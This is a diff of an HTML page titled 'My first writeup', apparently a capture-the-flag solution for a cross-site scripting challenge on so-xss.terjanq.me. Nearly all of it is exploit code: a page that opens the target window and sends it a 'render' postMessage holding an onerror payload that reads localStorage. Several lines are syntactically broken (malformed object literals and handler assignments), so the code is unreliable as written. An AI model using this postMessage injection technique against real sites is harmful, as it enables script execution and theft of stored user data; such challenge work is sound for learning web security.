@@ -6,18 +6,28 @@
     <title>My first writeup</title>
 </head>
 <body>
-    <h1>hello, I'll just redirect</h1>
-    <div id="out"></div>
-    
-    <iframe src="https://example.com" sandbox="allow-scripts allow-popups"></iframe>
-    <script>
-        window.addEventListener("message", (e) => {
-            if (event.origin !== "https://so-xss.terjanq.me") {
-        return;
-    }
-          alert(e.data);
 
-        });
-    </script>
+<script>
+let iframe=document.createElement("iframe");
+let payload="x=opener.top; opener.postMessage(1,'*'); setTimeout(() => {x.postMessage(type: 'render', body:'<img src=x onerror=alert(localStorage.html)>'),'*'}";
+iframe.srcdoc=`<h1>hello</h1>
+<script>
+ onclick = e => {
+    let w=window.open("https://so-xss.terjanq.me/iframe.php");
+    onmessage => top.location="https://so-xss.terjanq.me/iframe.php";
+   setTimeout(()=>{
+    w.postMessage({type:'render',body:<audio/src/onerror=\\"${payload}\\"});},1000);
+
+ 
+ }
+
+
+  </script>
+`
+
+
+</script>
+
+
 </body>
 </html>
